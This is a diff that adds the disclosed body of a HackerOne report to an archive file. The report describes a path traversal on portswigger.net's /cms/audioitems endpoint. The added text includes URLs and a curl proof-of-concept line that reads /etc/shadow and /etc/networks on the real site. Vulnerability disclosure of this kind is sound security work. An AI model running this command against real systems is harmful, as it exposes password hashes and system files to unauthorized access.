@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Path Traversal"
 enriched: true
+body: true
 date: 2024-04-04
 submitted: 2024-03-20T07:26:29.063Z
 bounty_usd: null
@@ -25,6 +26,28 @@ title: "[portswigger.net] Path Traversal al /cms/audioitems"
 - Report: [https://hackerone.com/reports/2424815](https://hackerone.com/reports/2424815)
 - CWE: Path Traversal
 - Submitted: 2024-03-20T07:26:29.063Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Prelude.
+I wasn't going to report it, I thought it was your laboratory but after my first analysis this seems real.
+
+**Description**
+It's detected a path traversal as root user that allows to remote attackers see internal files as root.
+
+`https://portswigger.net/cms/audioitems//etc/networks`
+`https://portswigger.net/cms/audioitems//etc/shadow`
+
+
+**Poc**
+`curl -kis "https://portswigger.net/cms/audioitems//etc/shadow"`
+{F3132191}
+
+## Impact
+
+Abilit to read internal files as root
 
 ## Timeline
 
